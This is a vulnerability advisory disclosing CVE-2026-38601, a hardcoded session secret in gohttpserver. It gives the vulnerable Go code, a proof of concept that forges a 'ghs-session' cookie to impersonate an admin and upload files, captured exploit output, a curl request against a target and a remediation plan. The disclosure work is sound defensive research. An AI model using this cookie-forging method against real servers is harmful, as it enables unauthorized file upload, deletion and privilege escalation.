# VDR-002: Hardcoded Session Secret in gohttpserver

- **Target**: [codeskyblue/gohttpserver](https://github.com/codeskyblue/gohttpserver)
- **Severity**: High (CVSS 3.1: 7.5)
- **CWE**: [CWE-798](https://cwe.mitre.org/data/definitions/798.html) - Use of Hard-coded Credentials
- **CVE**: [CVE-2026-38601](https://www.cve.org/CVERecord?id=CVE-2026-38601)
- **CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`
- **Discovered**: 2026-03-19
- **Researcher**: Dennis Sepede - [Securitix Solutions](https://securitixsolutions.com)

## Summary

`gohttpserver` (all versions through v1.3.0) initialises its session cookie store with a **hardcoded, compile-time secret key that is identical across every installation**. Because the value is published in the public source code, any remote attacker can forge a validly-signed `ghs-session` cookie and have the server accept it as a logged-in user. This lets the attacker assume the identity of any user named in a directory's `.ghs.yml` ACL and thereby obtain that user's `upload`/`delete` privileges, bypassing the per-user access control.

The hardcoded secret is:

```go
// openid-login.go:18
store = sessions.NewCookieStore([]byte("something-very-secret"))
```

i.e. the literal key is **`something-very-secret`**.

> Severity note: the original stub rated this Critical (9.1). On close review of what the session actually gates in this codebase, the demonstrated and certain impact is **Integrity** (gaining another user's upload/delete rights), not a full confidentiality breach - file *browsing* is governed by `accessTables` regexes, not by the session. The score is therefore set, conservatively and defensibly, to **High 7.5** (`C:N/I:H/A:N`). If a deployment additionally relies on sessions for confidentiality of restricted views, `C:L/I:H/A:N` (8.2) would apply.

## Affected Component

- `openid-login.go:18` - the cookie store is constructed with the hardcoded key `"something-very-secret"`.
- `openid-login.go:19` - session name `"ghs-session"`.
- `httpstaticserver.go:554-575` - `canUpload()` reads the user identity straight out of this cookie store.
- `httpstaticserver.go:527-543` - `canDelete()` does the same for delete rights.

## Details

### The hardcoded key and how identity is trusted

The session store is a package-level variable seeded with a constant:

```go
// openid-login.go:15-20
var (
    nonceStore         = openid.NewSimpleNonceStore()
    discoveryCache     = openid.NewSimpleDiscoveryCache()
    store              = sessions.NewCookieStore([]byte("something-very-secret"))
    defaultSessionName = "ghs-session"
)
```

`gorilla/sessions.NewCookieStore([]byte(key))` uses `key` as the HMAC signing key for `gorilla/securecookie`. The signed payload is the gob-encoded `session.Values` map. The OpenID callback places a `*UserInfo` into that map:

```go
// openid-login.go:67-74
user := &UserInfo{
    Id:       id,
    Email:    r.FormValue("openid.sreg.email"),
    Name:     r.FormValue("openid.sreg.fullname"),
    NickName: r.FormValue("openid.sreg.nickname"),
}
session.Values["user"] = user
if err := session.Save(r, w); err != nil { ... }
```

The authorization checks then trust whatever identity is decoded from that cookie:

```go
// httpstaticserver.go:554-575  (canUpload)
func (c *AccessConf) canUpload(r *http.Request) bool {
    token := r.FormValue("token")
    if token != "" {
        return c.canUploadByToken(token)
    }
    session, err := store.Get(r, defaultSessionName)   // verifies HMAC with the hardcoded key
    if err != nil {
        return c.Upload
    }
    val := session.Values["user"]
    if val == nil {
        return c.Upload
    }
    userInfo := val.(*UserInfo)
    for _, rule := range c.Users {
        if rule.Email == userInfo.Email {               // identity taken from the cookie
            return rule.Upload
        }
    }
    return c.Upload
}
```

Because the signing key is a public constant, an attacker can construct a `session.Values["user"] = &UserInfo{Email: "<privileged-email>"}`, sign it with `something-very-secret`, and `store.Get()` will accept it. The server cannot distinguish this from a cookie minted by a genuine login, since both are signed with the same key.

### What the session actually gates (scope honesty)

In this codebase the `ghs-session` cookie is consulted **only** by `canUpload()` and `canDelete()` to refine per-user `upload`/`delete` flags from `.ghs.yml`, and by the OpenID helper endpoints. It does not gate file reads (those use `accessTables`). The concrete, proven impact is therefore privilege escalation to a configured user's **write/delete** rights. (See also the routing nuance below.)

### Routing nuance discovered during testing

The OpenID login handlers (`/-/login`, `/-/openidcallback`, `/-/user`) are registered on `http.DefaultServeMux` via `http.HandleFunc` (`openid-login.go:37-111`), but the server actually serves traffic through a `gorilla/mux` router whose catch-all `router.PathPrefix("/").Handler(hdlr)` (`main.go:272`) routes everything to the static-file handler. As a result those `/-/...` OpenID endpoints are effectively unreachable in this build (a separate latent upstream bug). This does **not** affect the vulnerability: `canUpload()`/`canDelete()` read the cookie store directly inside the reachable static handler, so cookie forgery still grants upload/delete - which the PoC demonstrates against the unmodified binary.

## Proof of Concept

Reproduced end-to-end against the real `gohttpserver` binary built from source (commit `c33d446`). A cookie is forged offline using only the public hardcoded secret, then accepted by the unmodified server to perform an upload that is denied to anonymous clients.

### Forging tool

`poc/VDR-002/forge_main.go` (with `poc/VDR-002/forge_go.mod`) reconstructs the cookie the exact way the server does - same libraries and versions (`gorilla/sessions v1.2.0`, `gorilla/securecookie v1.1.1`), same gob-registered `*UserInfo` type (registered as `main.UserInfo`), same session name `ghs-session`, same key - so the output is accepted by the upstream binary:

```go
const hardcodedSecret = "something-very-secret"   // openid-login.go:18
const defaultSessionName = "ghs-session"           // openid-login.go:19
store := sessions.NewCookieStore([]byte(hardcodedSecret))
sess, _ := store.New(req, defaultSessionName)
sess.Values["user"] = &UserInfo{Email: email, ...}
sess.Save(req, rec)                                // -> Set-Cookie: ghs-session=...
```

### Scenario

The served root contains a restrictive `.ghs.yml`: global uploads disabled, and only `admin@securitix.local` may upload/delete:

```yaml
upload: false
delete: false
users:
- email: "admin@securitix.local"
  upload: true
  delete: true
```

The server is started **without** `--upload`, so an anonymous client cannot upload.

### Captured output (`poc/VDR-002/OUTPUT.txt`, from `poc/VDR-002/run_poc.ps1`)

```
[1] Forging 'ghs-session' cookie for admin@securitix.local using hardcoded secret...
    [*] secret used        : "something-very-secret" (gohttpserver openid-login.go:18)
    [*] session name       : "ghs-session"
    [*] forged identity    : email="admin@securitix.local" name="Admin" id="...FORGED"
    forged cookie  : ghs-session=MTc4MDY2NzYyMHxEWDhFQVFMX2dBQUJFQUVR...QQXzCMFlodmHZrnGv5OBXo4HouUH2yl7cusOzzDBfqoFvKw==

[5a] POST /upload WITHOUT cookie (expected: Upload forbidden):
    Upload forbidden  HTTP_STATUS:403

[5b] POST /upload WITH forged cookie (expected: success - bypass):
    {"destination":"...\\served_root\\evil_payload.txt","success":true}  HTTP_STATUS:200

[6] Did the forged-session upload land on disk?
    [PROVEN] File written via forged session: ...\served_root\evil_payload.txt
    contents: uploaded by a FORGED session - CVE-2026-38601

RESULT: AUTH BYPASS CONFIRMED - forged cookie grants the privileged
        user's upload rights on the UNMODIFIED upstream binary.
```

- **Without** the cookie: `Upload forbidden` (HTTP 403).
- **With** the forged cookie: `{"success":true}` (HTTP 200) and the file is written.

### Negative control - the signature really is validated (`poc/VDR-002/OUTPUT_negative.txt`, from `poc/VDR-002/run_poc_negative.ps1`)

To prove the success is due to a correctly-forged signature (not the cookie being ignored), a tampered/garbage `ghs-session` value was also sent:

```
[N1] Upload with TAMPERED cookie (expect: forbidden / signature fails):
     Upload forbidden  HTTP_STATUS:403
[N2] Upload with CORRECTLY-FORGED cookie (expect: success):
     {"destination":"...\\served_root\\neg_good.txt","success":true}  HTTP_STATUS:200

[PROVEN] Tampered cookie rejected, forged-with-hardcoded-secret cookie accepted.
```

The server cryptographically validates the cookie against `something-very-secret`; a forgery made with that public constant is accepted, a random one is rejected. This is the defining property of CWE-798 here.

The equivalent over-the-wire request is:

```bash
curl -s -b 'ghs-session=<forged-value>' -F 'file=@payload.txt' 'http://TARGET:8000/'
```

## Impact

- **Authentication/identity forgery**: an unauthenticated remote attacker mints a `ghs-session` cookie for any chosen email.
- **Privilege escalation / ACL bypass**: by impersonating an email listed in `.ghs.yml`, the attacker obtains that user's `upload` and `delete` rights even when those are denied to anonymous users (proven).
- This also composes with **CVE-2026-38600 (Zip Slip)**: on instances where upload is locked down to specific users, a forged session re-enables the upload path needed to deliver the Zip Slip archive, restoring the file-write-to-RCE chain.

## Recommendation

- Generate the session key **randomly at startup** (e.g. `securecookie.GenerateRandomKey(32)`), or require it to be supplied via configuration/secret and refuse to start with a default. Never ship a constant key in source.
- Rotate keys on restart or persist a per-deployment key outside the repository.
- The community fork (PR #233) addresses gohttpserver's reported issues; upstream is unmaintained.

## Status

| Date | Event |
|------|-------|
| 2026-03-19 | Vulnerability discovered during source code audit |
| 2026-03-19 | Report submitted via GitHub issue requesting Private Vulnerability Reporting |
| 2026-03-19 | Maintainer notified via direct email |
| 2026-04-13 | Public technical disclosure on issue #232 (no maintainer response) |
| 2026-04-13 | Community fix in fork: [PR #233](https://github.com/codeskyblue/gohttpserver/pull/233) |
| 2026-04-14 | CVE-2026-38601 assigned by MITRE |
| 2026-06-05 | Full technical advisory published (coordinated-disclosure window elapsed; upstream unmaintained) |
| - | Upstream maintainer: no response, project unmaintained |

## References

- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- [OWASP: Use of Hard-coded Password](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password)
- [Upstream repository: codeskyblue/gohttpserver](https://github.com/codeskyblue/gohttpserver)
- [Public disclosure: issue #232](https://github.com/codeskyblue/gohttpserver/issues/232)
- [Community fix: PR #233](https://github.com/codeskyblue/gohttpserver/pull/233)
